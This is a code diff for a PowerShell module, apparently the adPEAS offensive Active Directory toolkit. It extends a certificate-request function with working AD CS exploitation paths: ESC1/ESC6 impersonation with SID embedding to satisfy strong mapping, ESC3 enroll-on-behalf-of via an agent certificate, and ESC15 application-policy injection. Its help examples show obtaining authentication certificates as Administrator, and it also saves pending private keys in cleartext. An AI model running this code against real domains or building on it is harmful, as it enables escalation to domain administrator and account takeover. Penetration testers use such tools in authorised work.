+        Write-Log "$FunctionPrefix Built PFX ($($pfxBytes.Length) bytes)"
+    }
+    catch {
+        Write-Log "$FunctionPrefix CopyWithPrivateKey failed: $_"
+        Write-Warning "[!] Failed to create PFX. .NET Framework 4.7.2+ is required."
+        return $null
+    }
+
+    # Resolve output path
+    if (-not $OutputPath) {
+        # Extract CN from the ISSUED certificate (CA may override the requested subject)
+        $cnForFile = if ($IssuedCert.Subject -match 'CN=([^,]+)') { $Matches[1].Trim() } else { 'certificate' }
+        $pfxTimestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+        $OutputPath = "${cnForFile}_${pfxTimestamp}.pfx"
+        Write-Log "$FunctionPrefix Derived output path: $OutputPath"
+    }
+
+    $exportResult = Export-adPEASFile -Path $OutputPath -Content $pfxBytes -Type Binary -SanitizeFilename -Force:$Force
+    if (-not $exportResult.Success) {
+        Write-Warning "[!] Failed to save PFX: $($exportResult.Message)"
+        return $null
+    }
+    $OutputPath = $exportResult.Path
+
+    # Display results
+    Show-Line "Certificate saved as PFX:" -Class Hint
+    Show-KeyValue "PFX Path:" $OutputPath
+    if ($pfxPassword) {
+        Show-KeyValue "PFX Password:" $pfxPassword
+    } else {
+        Show-KeyValue "PFX Password:" "(none)" -Class Note
+    }
+    Show-KeyValue "Thumbprint:" $IssuedCert.Thumbprint
+    Show-KeyValue "Subject:" $IssuedCert.Subject
+    Show-KeyValue "Issuer:" $IssuedCert.Issuer
+    Show-KeyValue "Valid Until:" $IssuedCert.NotAfter.ToString("yyyy-MM-dd")
+    if ($TemplateName) {
+        Show-KeyValue "Template:" $TemplateName
+    }
+
+    # Show SANs from issued certificate
+    $sanExt = $IssuedCert.Extensions | Where-Object { $_.Oid.Value -eq '2.5.29.17' }
+    if ($sanExt) {
+        Show-KeyValue "SAN:" $sanExt.Format($false)
+    }
+    # Show NTDS CA Security (SID) extension presence - confirms strong mapping
+    $sidExt = $IssuedCert.Extensions | Where-Object { $_.Oid.Value -eq '1.3.6.1.4.1.311.25.2' }
+    if ($sidExt) {
+        Show-KeyValue "SID Extension:" "present (strong mapping enabled)"
+    }
+
+    Show-EmptyLine
+
+    # Show usage hints
+    $domainHint = if ($Script:LDAPContext -and $Script:LDAPContext['Domain']) { $Script:LDAPContext['Domain'] } else { '<domain>' }
+    Show-Line "Usage with Connect-adPEAS:" -Class Note
+    if ($pfxPassword) {
+        Show-Line "Connect-adPEAS -Domain $domainHint -Certificate '$OutputPath' -CertificatePassword '$pfxPassword'"
+    } else {
+        Show-Line "Connect-adPEAS -Domain $domainHint -Certificate '$OutputPath'"
+    }
+
+    # Save certificate properties before disposing
+    $certThumbprint = $IssuedCert.Thumbprint
+    $certSubject = $IssuedCert.Subject
+    $certIssuer = $IssuedCert.Issuer
+    $IssuedCert.Dispose()
+
+    return [PSCustomObject]@{
+        Success     = $true
+        Status      = 'Issued'
+        RequestID   = $RequestID
+        PFXPath     = $OutputPath
+        PFXPassword = if ($pfxPassword) { $pfxPassword } else { $null }
+        Thumbprint  = $certThumbprint
+        Subject     = $certSubject
+        Issuer      = $certIssuer
+        Template    = $TemplateName
+        CAServer    = $CAServer
+    }
+}
+
+<#
+.SYNOPSIS
+    Serializes an RSA private key (plus request metadata) to a JSON sidecar so a
+    pending certificate request can be completed later with -RetrieveID.
+.NOTES
+    The key is written in cleartext. Protect or delete the file after use.
+#>
+function Save-PendingPrivateKey {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory)]
+        [System.Security.Cryptography.RSA]$RSA,
+
+        [Parameter(Mandatory)]
+        $RequestID,
+
+        [string]$Subject,
+        [string]$CAServer,
+
+        [Parameter(Mandatory)]
+        [string]$OutputPath,
+
+        [switch]$Force
+    )
+
+    $FunctionPrefix = "[Save-PendingPrivateKey]"
+    $p = $RSA.ExportParameters($true)
+
+    $obj = [PSCustomObject]@{
+        Type      = 'adPEAS-PendingKey'
+        Version   = 1
+        RequestID = $RequestID
+        Subject   = $Subject
+        CAServer  = $CAServer
+        Modulus   = [Convert]::ToBase64String($p.Modulus)
+        Exponent  = [Convert]::ToBase64String($p.Exponent)
+        D         = [Convert]::ToBase64String($p.D)
+        P         = [Convert]::ToBase64String($p.P)
+        Q         = [Convert]::ToBase64String($p.Q)
+        DP        = [Convert]::ToBase64String($p.DP)
+        DQ        = [Convert]::ToBase64String($p.DQ)
+        InverseQ  = [Convert]::ToBase64String($p.InverseQ)
+    }
+
+    $json = $obj | ConvertTo-Json
+    $exportResult = Export-adPEASFile -Path $OutputPath -Content $json -Type Text -SanitizeFilename -Force:$Force
+    if (-not $exportResult.Success) {
+        throw "Failed to write key file: $($exportResult.Message)"
+    }
+    Write-Log "$FunctionPrefix Saved pending private key to $($exportResult.Path)"
+    return $exportResult.Path
+}
+
+<#
+.SYNOPSIS
+    Reconstructs an RSA private key from a JSON sidecar written by Save-PendingPrivateKey.
+#>
+function Restore-PendingPrivateKey {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory)]
+        [string]$KeyFile
+    )
+
+    $FunctionPrefix = "[Restore-PendingPrivateKey]"
+
+    if (-not (Test-Path -Path $KeyFile)) {
+        throw "Key file not found: $KeyFile"
+    }
+
+    $j = Get-Content -Path $KeyFile -Raw | ConvertFrom-Json
+    if ($j.Type -ne 'adPEAS-PendingKey') {
+        throw "Unrecognized key file format: $KeyFile"
+    }
+
+    $p = New-Object System.Security.Cryptography.RSAParameters
+    $p.Modulus  = [Convert]::FromBase64String($j.Modulus)
+    $p.Exponent = [Convert]::FromBase64String($j.Exponent)
+    $p.D        = [Convert]::FromBase64String($j.D)
+    $p.P        = [Convert]::FromBase64String($j.P)
+    $p.Q        = [Convert]::FromBase64String($j.Q)
+    $p.DP       = [Convert]::FromBase64String($j.DP)
+    $p.DQ       = [Convert]::FromBase64String($j.DQ)
+    $p.InverseQ = [Convert]::FromBase64String($j.InverseQ)
+
+    $rsa = [System.Security.Cryptography.RSA]::Create()
+    $rsa.ImportParameters($p)
+
+    Write-Log "$FunctionPrefix Restored private key from $KeyFile (RequestID=$($j.RequestID))"
+    return [PSCustomObject]@{
+        RSA       = $rsa
+        RequestID = $j.RequestID
+        Subject   = $j.Subject
+        CAServer  = $j.CAServer
+    }
+}
+
+<#
+.SYNOPSIS
+    Retrieves a previously submitted certificate request by ID and pairs it with the
+    saved private key into a PFX. Backs the -RetrieveID mode of Request-ADCSCertificate.
+#>
+function Invoke-ADCSRetrieve {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory)]
+        [int]$RetrieveID,
+
+        [string]$KeyFile,
+        [string]$CAServer,
+        [PSCredential]$Credential,
+        [switch]$UseHTTP,
+        [int]$Port = 0,
+        [string]$OutputPath,
+        [switch]$NoPassword,
+        [switch]$PassThru,
+        [switch]$Force
+    )
+
+    $FunctionPrefix = "[Invoke-ADCSRetrieve]"
+
+    if ([string]::IsNullOrEmpty($CAServer)) {
+        Write-Warning "[!] -RetrieveID requires -CAServer (the CA host that issued the request)."
+        return $null
+    }
+    if ([string]::IsNullOrEmpty($KeyFile)) {
+        Write-Warning "[!] -RetrieveID requires -KeyFile (the *.key.json saved when the request went pending)."
+        return $null
+    }
+
+    # Restore the private key
+    try {
+        $restored = Restore-PendingPrivateKey -KeyFile $KeyFile
+    }
+    catch {
+        Write-Warning "[!] $_"
+        return $null
+    }
+    $rsa = $restored.RSA
+
+    try {
+        Show-Line "Retrieving certificate (Request ID: $RetrieveID) from CA '$CAServer'" -Class Note
+
+        # Try HTTPS then HTTP unless -UseHTTP forces HTTP
+        $httpModes = if ($UseHTTP) { @($true) } else { @($false, $true) }
+        $issuedCert = $null
+        foreach ($httpMode in $httpModes) {
+            Write-Log "$FunctionPrefix Attempting retrieval (http=$httpMode)"
+            $issuedCert = Get-CertsrvCertificate -CAServer $CAServer -RequestID $RetrieveID `
+                -Credential $Credential -UseHTTP:$httpMode -Port $Port
+            if ($issuedCert) { break }
+        }
+
+        if (-not $issuedCert) {
+            Write-Warning "[!] Failed to retrieve certificate for Request ID $RetrieveID (not yet approved, denied, or wrong CA?)."
+            return $null
+        }
+
+        $pfxResult = Save-IssuedCertificatePFX -IssuedCert $issuedCert -RSA $rsa `
+            -OutputPath $OutputPath -NoPassword:$NoPassword `
+            -RequestID $RetrieveID -CAServer $CAServer -Force:$Force
+        if (-not $pfxResult) {
+            return $null
+        }
+        if ($PassThru) {
+            return $pfxResult
+        }
+    }
+    finally {
+        if ($rsa) { $rsa.Dispose() }
     }
 }
 
@@ -884,8 +1620,54 @@ function Request-ADCSCertificate {
     FQDN of the CA server (e.g., "ca01.contoso.com").
     If not specified, auto-discovers from AD using Get-CertificateAuthority.
 
+.PARAMETER CAName
+    Logical CA name (e.g., "CONTOSO-CA01-CA"). Required for the COM/RPC method when
+    using an explicit -CAServer; auto-filled from AD discovery otherwise.
+
 .PARAMETER TemplateName
     Certificate template name (e.g., "User", "WebServer", "Machine").
+    Required for a new request; omitted when using -RetrieveID.
+
+.PARAMETER SID
+    Object SID embedded in the NTDS CA Security Extension (1.3.6.1.4.1.311.25.2) for
+    strong certificate mapping. Required for ESC1/ESC6 impersonation to authenticate
+    against DCs with StrongCertificateBindingEnforcement (KB5014754, mandatory since
+    Feb 2025). When omitted, the SID is auto-resolved via LDAP from the impersonated
+    identity (UPN/DNS/Subject) if a session exists.
+
+.PARAMETER NoSID
+    Disable SID resolution/embedding entirely (e.g., for templates/CAs where the SID
+    extension is undesired).
+
+.PARAMETER Method
+    Submission transport: Auto (default; Web first, COM/RPC fallback when Web
+    Enrollment is absent), Web (certsrv only), or COM (ICertRequest DCOM only).
+
+.PARAMETER Port
+    Custom TCP port for the certsrv Web Enrollment endpoint. Default 0 uses the
+    scheme default (80 for HTTP, 443 for HTTPS). Combine with -UseHTTP for plain
+    HTTP on a non-standard port.
+
+.PARAMETER RetrieveID
+    Retrieve a previously submitted request by ID (after manager approval) and pair
+    it with the saved private key (-KeyFile) into a PFX. Requires -CAServer and -KeyFile.
+
+.PARAMETER KeyFile
+    Path to the *.key.json sidecar written when a request went pending. Used with
+    -RetrieveID to reconstruct the private key.
+
+.PARAMETER OnBehalfOf
+    ESC3 exploitation: request a certificate on behalf of this principal
+    (format "DOMAIN\user"). Requires -PFX pointing to an enrollment-agent
+    certificate that holds the Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1).
+    The inner CSR is wrapped in a PKCS#7 SignedData signed by the agent certificate.
+
+.PARAMETER PFX
+    Path or Base64 of the enrollment-agent PKCS#12/PFX (certificate + private key)
+    used to sign an -OnBehalfOf request.
+
+.PARAMETER PFXPassword
+    Password protecting the -PFX enrollment-agent certificate.
 
 .PARAMETER Impersonate
     Convenience parameter for ESC1/ESC4 exploitation. Accepts a username, UPN, or
@@ -918,8 +1700,17 @@ function Request-ADCSCertificate {
 
 .PARAMETER AlternativeNames
     Raw Subject Alternative Names with type prefix. For advanced use cases.
-    Supported formats: "UPN:user@domain.com", "DNS:host.domain.com"
+    Supported formats: "UPN:user@domain.com", "DNS:host.domain.com", "URL:..."
     Prefer -UPN and -DNS parameters for simpler usage.
+
+.PARAMETER ApplicationPolicies
+    ESC13/ESC15 (EKUwu / CVE-2024-49019): inject Microsoft Application Policy OIDs
+    into the request via the szOID_APPLICATION_CERT_POLICIES extension
+    (1.3.6.1.4.1.311.21.10). On schema-v1 templates these are not sanitised, so EKUs
+    the template does not list can be obtained. Accepts raw OIDs or friendly names:
+    "Client Authentication", "Server Authentication", "Smart Card Logon",
+    "Certificate Request Agent", "Code Signing", "PKINIT Client Authentication",
+    "Secure Email", "Any Purpose".
 
 .PARAMETER KeyLength
     RSA key length in bits. Default: 2048. Valid: 1024, 2048, 4096.
@@ -991,6 +1782,38 @@ function Request-ADCSCertificate {
     Request-ADCSCertificate -TemplateName "WebServer" -Subject "dc01.contoso.com" -DNS "dc01.contoso.com"
     Requests a machine certificate with DNS SAN.
 
+.EXAMPLE
+    Request-ADCSCertificate -TemplateName "VulnTemplate" -UPN "administrator@contoso.com" -SID "S-1-5-21-1-2-3-500"
+    ESC1 with an explicit SID embedded for strong mapping against patched DCs.
+
+.EXAMPLE
+    Request-ADCSCertificate -CAServer "ca01.contoso.com" -CAName "CONTOSO-CA01-CA" -TemplateName "User" -Method COM
+    Forces the COM/RPC (ICertRequest DCOM) transport - useful when Web Enrollment (/certsrv/) is not installed.
+
+.EXAMPLE
+    Request-ADCSCertificate -TemplateName "WebServer" -ApplicationPolicies "Client Authentication" -UPN "administrator@contoso.com"
+    ESC15 (EKUwu): inject the Client Authentication EKU on a schema-v1 template to get an auth-capable cert as Administrator.
+
+.EXAMPLE
+    # ESC15 variant B: turn a schema-v1 cert into an enrollment agent, then chain ESC3
+    Request-ADCSCertificate -TemplateName "WebServer" -ApplicationPolicies "Certificate Request Agent" -NoPassword
+    Request-ADCSCertificate -TemplateName "User" -OnBehalfOf "CONTOSO\Administrator" -PFX ".\webserver.pfx"
+
+.EXAMPLE
+    # ESC3 step 1: enroll for an enrollment-agent certificate
+    Request-ADCSCertificate -TemplateName "EnrollmentAgent" -NoPassword -PassThru
+    # ESC3 step 2: use the agent cert to request as Administrator on their behalf
+    Request-ADCSCertificate -TemplateName "User" -OnBehalfOf "CONTOSO\Administrator" -PFX ".\agent.pfx"
+    Enroll-on-behalf-of (ESC3): the agent certificate signs a request for the target principal.
+
+.EXAMPLE
+    Request-ADCSCertificate -CAServer "ca01.contoso.com" -TemplateName "User" -UseHTTP -Port 8080
+    Requests over plain HTTP on a non-standard certsrv port (no HTTPS attempt).
+
+.EXAMPLE
+    Request-ADCSCertificate -RetrieveID 1337 -CAServer "ca01.contoso.com" -KeyFile ".\administrator_req1337.key.json"
+    Retrieves a previously pending request after approval and builds the PFX with the saved key.
+
 .NOTES
     Author: Alexander Sturz (@_61106960_)
 #>
@@ -998,7 +1821,12 @@ function Request-ADCSCertificate {
     param(
         [string]$CAServer,
 
-        [Parameter(Mandatory)]
+        # Logical CA name (e.g. "CONTOSO-CA01-CA") - required for COM/RPC against an
+        # explicit -CAServer; auto-filled from AD discovery otherwise.
+        [string]$CAName,
+
+        # Template is mandatory for a new request, but not for -RetrieveID.
+        # Validated manually in the body so -RetrieveID can omit it.
         [string]$TemplateName,
 
         [string]$Impersonate,
@@ -1010,10 +1838,51 @@ function Request-ADCSCertificate {
 
         [string[]]$DNS,
 
+        # Object SID embedded in the NTDS CA Security Extension for strong mapping
+        # (required for ESC1/ESC6 impersonation against patched DCs). Auto-resolved
+        # from the impersonated identity when omitted and an LDAP session exists.
+        [string]$SID,
+
+        # Disable automatic SID resolution/embedding entirely.
+        [switch]$NoSID,
+
+        # ESC13/ESC15: inject Microsoft Application Policy OIDs or friendly names
+        # (e.g. "Client Authentication", "Certificate Request Agent") into the request.
+        [string[]]$ApplicationPolicies,
+
         [string[]]$AlternativeNames,
 
         [ValidateSet(1024, 2048, 4096)]
         [int]$KeyLength = 2048,
+
+        # Submission transport: Auto (web first, COM/RPC fallback), Web (certsrv
+        # only), or COM (ICertRequest DCOM only).
+        [ValidateSet('Auto', 'Web', 'COM')]
+        [string]$Method = 'Auto',
+
+        # Custom TCP port for the certsrv Web Enrollment endpoint. 0 = scheme default
+        # (80 for HTTP, 443 for HTTPS).
+        [ValidateRange(0, 65535)]
+        [int]$Port = 0,
+
+        # Retrieve a previously submitted (pending/issued) request by ID and pair it
+        # with the saved private key (see -KeyFile) into a PFX.
+        [int]$RetrieveID,
+
+        # Path to the *.key.json sidecar written for a pending request.
+        [string]$KeyFile,
+
+        # ESC3: request a certificate on behalf of this principal (DOMAIN\user) using
+        # an enrollment-agent certificate supplied via -PFX. The agent cert must hold
+        # the Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1).
+        [string]$OnBehalfOf,
+
+        # Path or Base64 of the enrollment-agent PKCS#12/PFX (cert + private key) used
+        # to sign the -OnBehalfOf request.
+        [string]$PFX,
+
+        # Password for the -PFX enrollment-agent certificate.
+        [string]$PFXPassword,
 
         [string]$OutputPath,
 
@@ -1032,14 +1901,86 @@ function Request-ADCSCertificate {
     process {
         $FunctionPrefix = "[Request-ADCSCertificate]"
 
+        $isRetrieve = $PSBoundParameters.ContainsKey('RetrieveID')
+
+        # Validate mandatory parameters depending on mode
+        if (-not $isRetrieve -and [string]::IsNullOrEmpty($TemplateName)) {
+            Write-Warning "[!] -TemplateName is required for a new certificate request."
+            return $null
+        }
+
+        # === Retrieve mode: pick up a previously submitted request ===
+        if ($isRetrieve) {
+            return Invoke-ADCSRetrieve -RetrieveID $RetrieveID -KeyFile $KeyFile `
+                -CAServer $CAServer -Credential $Credential -UseHTTP:$UseHTTP -Port $Port `
+                -OutputPath $OutputPath -NoPassword:$NoPassword -PassThru:$PassThru -Force:$Force
+        }
+
+        # === Validate / load enroll-on-behalf-of (ESC3) agent certificate ===
+        $oboAgentCert = $null
+        if ($OnBehalfOf) {
+            if ([string]::IsNullOrEmpty($PFX)) {
+                Write-Warning "[!] -OnBehalfOf requires -PFX (enrollment-agent certificate + private key)."
+                return $null
+            }
+            Write-Log "$FunctionPrefix Enroll-on-behalf-of mode for '$OnBehalfOf', loading agent certificate from '$PFX'"
+
+            try {
+                if (Test-Path -LiteralPath $PFX) {
+                    $pfxBytesIn = [System.IO.File]::ReadAllBytes((Resolve-Path -LiteralPath $PFX).Path)
+                }
+                else {
+                    $pfxBytesIn = [Convert]::FromBase64String(($PFX -replace '\s', ''))
+                }
+            }
+            catch {
+                Write-Warning "[!] Failed to read -PFX '$PFX' (not a valid file path or Base64): $_"
+                return $null
+            }
+
+            try {
+                $pfxPwdIn = if ($PSBoundParameters.ContainsKey('PFXPassword')) { $PFXPassword } else { $null }
+                $oboAgentCert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 `
+                    -ArgumentList ([byte[]]$pfxBytesIn), $pfxPwdIn, ([System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable)
+            }
+            catch {
+                Write-Warning "[!] Failed to load agent certificate from -PFX (wrong password?): $_"
+                return $null
+            }
+
+            if (-not $oboAgentCert.HasPrivateKey) {
+                Write-Warning "[!] Agent certificate has no associated private key - cannot sign the on-behalf-of request."
+                return $null
+            }
+
+            # Inform whether the agent cert advertises the Certificate Request Agent EKU
+            $hasAgentEku = $false
+            foreach ($ext in $oboAgentCert.Extensions) {
+                if ($ext -is [System.Security.Cryptography.X509Certificates.X509EnhancedKeyUsageExtension]) {
+                    foreach ($eku in $ext.EnhancedKeyUsages) {
+                        if ($eku.Value -eq '1.3.6.1.4.1.311.20.2.1') { $hasAgentEku = $true }
+                    }
+                }
+            }
+            if ($hasAgentEku) {
+                Show-Line "Loaded enrollment-agent certificate '$($oboAgentCert.Subject)' (Certificate Request Agent EKU present)" -Class Note
+            }
+            else {
+                Show-Line "Agent certificate '$($oboAgentCert.Subject)' does NOT advertise the Certificate Request Agent EKU - the CA may reject the request" -Class Hint
+            }
+        }
+
         # === Step 1: Determine CA Server ===
         # Tracks ordered list of CAs to try (for fallback)
         $candidateCAs = @()
 
         if ($CAServer) {
-            # Explicit CA server - single candidate, no discovery needed
+            # Explicit CA server - single candidate, no discovery needed.
+            # Name carries the logical CA name (needed for COM/RPC); when -CAName is
+            # not supplied it stays empty and only the Web method is available.
+            Write-Log "$FunctionPrefix Explicit CA server '$CAServer' (CAName='$CAName')"
             $candidateCAs = @([PSCustomObject]@{
-                Name            = $CAServer
+                Name            = $CAName
                 DNSHostName     = $CAServer
                 CertificateTemplates = @()
                 _Explicit       = $true
@@ -1128,104 +2069,145 @@ function Request-ADCSCertificate {
             }
         }
 
-        # === Step 1b: Try candidate CAs in order (HTTPS first, HTTP fallback) ===
+        # === Step 1b: Select a CA and submission method ===
+        # For each candidate, determine the usable transport:
+        #   - Web : /certsrv/ reachable (probed HTTPS first, then HTTP)
+        #   - COM : ICertRequest DCOM, usable whenever the logical CA name is known
+        # -Method controls which transports are eligible:
+        #   Auto -> Web preferred, COM fallback when web enrollment is absent
+        #   Web  -> Web only
+        #   COM  -> COM only (no /certsrv/ probing; requires the CA name)
         $CAServer = $null
+        $resolvedCAName = $null
+        $resolvedMethod = $null
         $resolvedUseHTTP = $UseHTTP.IsPresent
         $lastError = $null
+
+        $webEligible = ($Method -eq 'Auto' -or $Method -eq 'Web')
+        $comEligible = ($Method -eq 'Auto' -or $Method -eq 'COM')
 
         # Build protocol list: -UseHTTP means only HTTP, otherwise try HTTPS then HTTP
         $protocolsToTry = if ($UseHTTP) { @('http') } else { @('https', 'http') }
 
         foreach ($candidateCA in $candidateCAs) {
             $testHost = $candidateCA.DNSHostName
-            $caReached = $false
+            $candidateCAName = $candidateCA.Name
+            $caSelected = $false
 
-            foreach ($protocol in $protocolsToTry) {
-                $testUrl = "${protocol}://${testHost}/certsrv/"
-                Write-Log "$FunctionPrefix Testing CA endpoint: $testUrl"
+            # --- Try Web enrollment reachability ---
+            if ($webEligible) {
+                $portPart = if ($Port -gt 0) { ":$Port" } else { "" }
+                foreach ($protocol in $protocolsToTry) {
+                    $testUrl = "${protocol}://${testHost}${portPart}/certsrv/"
+                    Write-Log "$FunctionPrefix Probing Web Enrollment endpoint: $testUrl"
 
-                try {
-                    $testRequest = [System.Net.HttpWebRequest]::Create($testUrl)
-                    $testRequest.Method = 'HEAD'
-                    $testRequest.Timeout = 5000
-                    $testRequest.AllowAutoRedirect = $true
-
-                    # Temporarily ignore SSL errors for reachability check
-                    $origCallback = [System.Net.ServicePointManager]::ServerCertificateValidationCallback
-                    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
-
-                    if ($Credential) {
-                        $testRequest.Credentials = $Credential.GetNetworkCredential()
-                    }
-                    else {
-                        $testRequest.UseDefaultCredentials = $true
-                    }
-
-                    $testResponse = $null
                     try {
-                        $testResponse = $testRequest.GetResponse()
-                        $statusCode = [int]$testResponse.StatusCode
-                    }
-                    catch [System.Net.WebException] {
-                        $webEx = $_.Exception
-                        if ($webEx.Response) {
-                            $statusCode = [int]$webEx.Response.StatusCode
-                            try { $webEx.Response.Close() } catch { }
-                            try { $webEx.Response.Dispose() } catch { }
+                        $testRequest = [System.Net.HttpWebRequest]::Create($testUrl)
+                        $testRequest.Method = 'HEAD'
+                        $testRequest.Timeout = 5000
+                        $testRequest.AllowAutoRedirect = $true
+
+                        # Temporarily ignore SSL errors for reachability check
+                        $origCallback = [System.Net.ServicePointManager]::ServerCertificateValidationCallback
+                        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+
+                        if ($Credential) {
+                            $testRequest.Credentials = $Credential.GetNetworkCredential()
                         }
                         else {
-                            throw
+                            $testRequest.UseDefaultCredentials = $true
                         }
-                    }
-                    finally {
-                        if ($testResponse) {
-                            try { $testResponse.Close() } catch { }
-                            try { $testResponse.Dispose() } catch { }
-                        }
-                        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $origCallback
-                    }
 
-                    # 200, 401, 403 all mean the endpoint exists and is reachable
-                    if ($statusCode -in @(200, 301, 302, 401, 403)) {
-                        $CAServer = $testHost
-                        $resolvedUseHTTP = ($protocol -eq 'http')
-                        Write-Log "$FunctionPrefix CA endpoint reachable: $testUrl (HTTP $statusCode)"
-                        if ($protocol -eq 'http' -and -not $UseHTTP) {
-                            Show-Line "HTTPS not available on '$testHost', falling back to HTTP" -Class Hint
+                        $testResponse = $null
+                        try {
+                            $testResponse = $testRequest.GetResponse()
+                            $statusCode = [int]$testResponse.StatusCode
                         }
-                        $caReached = $true
-                        break
+                        catch [System.Net.WebException] {
+                            $webEx = $_.Exception
+                            if ($webEx.Response) {
+                                $statusCode = [int]$webEx.Response.StatusCode
+                                try { $webEx.Response.Close() } catch { }
+                                try { $webEx.Response.Dispose() } catch { }
+                            }
+                            else {
+                                throw
+                            }
+                        }
+                        finally {
+                            if ($testResponse) {
+                                try { $testResponse.Close() } catch { }
+                                try { $testResponse.Dispose() } catch { }
+                            }
+                            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $origCallback
+                        }
+
+                        # 200/301/302/401/403 all mean the endpoint exists and is reachable
+                        if ($statusCode -in @(200, 301, 302, 401, 403)) {
+                            $CAServer = $testHost
+                            $resolvedCAName = $candidateCAName
+                            $resolvedMethod = 'Web'
+                            $resolvedUseHTTP = ($protocol -eq 'http')
+                            Write-Log "$FunctionPrefix Web Enrollment reachable: $testUrl (HTTP $statusCode) -> method=Web"
+                            if ($protocol -eq 'http' -and -not $UseHTTP) {
+                                Show-Line "HTTPS not available on '$testHost', falling back to HTTP" -Class Hint
+                            }
+                            $caSelected = $true
+                            break
+                        }
+                        else {
+                            $lastError = "HTTP $statusCode"
+                            Write-Log "$FunctionPrefix Web Enrollment returned unexpected status: $testUrl - HTTP $statusCode"
+                        }
                     }
-                    else {
-                        $lastError = "HTTP $statusCode"
-                        Write-Log "$FunctionPrefix CA endpoint returned unexpected status: $testUrl - HTTP $statusCode"
+                    catch {
+                        $lastError = $_.Exception.Message
+                        Write-Log "$FunctionPrefix Web Enrollment unreachable: $testUrl - $lastError"
                     }
-                }
-                catch {
-                    $lastError = $_.Exception.Message
-                    Write-Log "$FunctionPrefix CA endpoint unreachable: $testUrl - $lastError"
                 }
             }
 
-            if ($caReached) { break }
+            if ($caSelected) { break }
 
-            # Neither HTTPS nor HTTP worked for this CA
+            # --- Fall back to COM/RPC for this CA (needs the logical CA name) ---
+            if ($comEligible) {
+                if ($candidateCAName) {
+                    $CAServer = $testHost
+                    $resolvedCAName = $candidateCAName
+                    $resolvedMethod = 'COM'
+                    if ($webEligible) {
+                        Show-Line "Web Enrollment unavailable on '$testHost', using COM/RPC (ICertRequest) instead" -Class Hint
+                    }
+                    Write-Log "$FunctionPrefix Selected COM/RPC for CA '$candidateCAName' on '$testHost'"
+                    $caSelected = $true
+                    break
+                }
+                else {
+                    $lastError = "COM/RPC requires the logical CA name (use -CAName)"
+                    Write-Log "$FunctionPrefix Cannot use COM/RPC for '$testHost' - CA name unknown"
+                }
+            }
+
+            # Nothing worked for this candidate
             if ($candidateCAs.Count -gt 1 -or -not $candidateCA._Explicit) {
-                Show-Line "CA '$($candidateCA.Name)' ($testHost) unreachable via /certsrv/ - trying next CA" -Class Note
+                Show-Line "CA '$($candidateCA.Name)' ($testHost) not usable ($Method) - trying next CA" -Class Note
             }
         }
 
         if (-not $CAServer) {
-            if ($candidateCAs.Count -eq 1 -and $candidateCAs[0]._Explicit) {
+            if ($Method -eq 'COM') {
+                Write-Warning "[!] No CA usable via COM/RPC. Ensure the logical CA name is known (use -CAName with -CAServer). Last error: $lastError"
+            }
+            elseif ($candidateCAs.Count -eq 1 -and $candidateCAs[0]._Explicit) {
                 Write-Warning "[!] Cannot reach CA server '$($candidateCAs[0].DNSHostName)': $lastError"
             }
             else {
-                Write-Warning "[!] None of the $($candidateCAs.Count) candidate CAs are reachable via /certsrv/. Last error: $lastError"
+                Write-Warning "[!] None of the $($candidateCAs.Count) candidate CAs are usable (method '$Method'). Last error: $lastError"
             }
             return $null
         }
 
-        Show-Line "Requesting certificate from CA '$CAServer' using template '$TemplateName'" -Class Note
+        Show-Line "Requesting certificate from CA '$CAServer' (method: $resolvedMethod) using template '$TemplateName'" -Class Note
 
         # === Step 1c: ModifyTemplate - Backup and modify template (ESC4) ===
         $templateBackupPath = $null
@@ -1374,6 +2356,13 @@ function Request-ADCSCertificate {
                     $resolvedSubjectDN = "CN=$hostPart"
                     Write-Log "$FunctionPrefix No -Subject specified, derived from -DNS: $resolvedSubjectDN"
                 }
+                elseif ($OnBehalfOf) {
+                    # ESC3: inner CSR subject = CN of the on-behalf-of user (domain stripped)
+                    $oboUser = $OnBehalfOf
+                    if ($oboUser -match '\\(.+)$') { $oboUser = $Matches[1] }
+                    $resolvedSubjectDN = "CN=$oboUser"
+                    Write-Log "$FunctionPrefix No -Subject specified, derived from -OnBehalfOf: $resolvedSubjectDN"
+                }
                 else {
                     # Default: current user from session
                     $currentUser = $null
@@ -1421,6 +2410,73 @@ function Request-ADCSCertificate {
                 Write-Log "$FunctionPrefix SANs: $($resolvedSANs -join ', ')"
             }
 
+            # Footgun guard: -Subject is literal (it only sets the DN). AD maps
+            # certificates via the SAN (UPN/DNS) + SID, not the Subject DN. If the
+            # Subject looks like a UPN or FQDN but no SAN was supplied, the issued
+            # certificate will not map to that principal - warn and point to -UPN/-DNS/-Impersonate.
+            if ($resolvedSANs.Count -eq 0 -and -not $OnBehalfOf) {
+                $cnValue = if ($resolvedSubjectDN -match 'CN=([^,]+)') { $Matches[1].Trim() } else { '' }
+                if ($cnValue -match '@') {
+                    Show-Line "Subject '$cnValue' looks like a UPN but no SAN was set - the certificate will NOT map to that user. Use -UPN or -Impersonate for impersonation." -Class Finding
+                }
+                elseif ($cnValue -match '^[^@\s]+\.[^@\s]+$') {
+                    Show-Line "Subject '$cnValue' looks like a DNS/FQDN but no SAN was set - the certificate will NOT map to that host. Use -DNS or -Impersonate." -Class Finding
+                }
+            }
+
+            # === Step 2b: Resolve the SID for strong certificate mapping ===
+            # On DCs with StrongCertificateBindingEnforcement (KB5014754, mandatory
+            # since Feb 2025) the issued certificate must carry the target principal's
+            # SID in the NTDS CA Security Extension, otherwise PKINIT mapping fails.
+            $resolvedSID = $null
+            if ($NoSID) {
+                Write-Log "$FunctionPrefix -NoSID specified, skipping SID extension"
+            }
+            elseif ($SID) {
+                $resolvedSID = $SID
+                Write-Log "$FunctionPrefix Using explicit -SID: $resolvedSID"
+            }
+            else {
+                # Derive the identity whose SID we should embed.
+                # For on-behalf-of, the issued cert belongs to that principal.
+                $sidTargetIdentity = $null
+                $upnSan = $resolvedSANs | Where-Object { $_ -match '^UPN:' } | Select-Object -First 1
